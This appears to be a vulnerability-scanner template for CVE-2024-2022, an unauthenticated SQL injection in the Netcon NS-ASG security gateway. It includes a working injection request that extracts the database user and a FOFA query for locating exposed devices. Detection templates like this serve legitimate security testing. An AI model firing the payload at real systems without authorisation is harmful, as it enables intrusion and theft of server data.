id: CVE-2024-2022

info:
  name: 网康科技NS-ASG 应用安全网关/admin/list_ipAddressPolicy.php接口存在SQL注入漏洞(CVE-2024-2022)
  author: linfeng7z
  severity: medium
  description: |
    网康科技 NS-ASG Application Security Gateway 6.3存在一个SQL注入漏洞，由于/admin/list_ipAddressPolicy.php中对参数GroupId没有进行严格的过滤和校验，未经身份验证的攻击者可以远程发起攻击获取服务器敏感数据。
  metadata:
    verified: true
    fofa-query: app="网康科技-NS-ASG安全网关"
  tags: cve,NS-ASG,sql

http:
  - raw:
      - |
        GET /admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e)) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "@localhost"

      - type: status
        status:
          - 200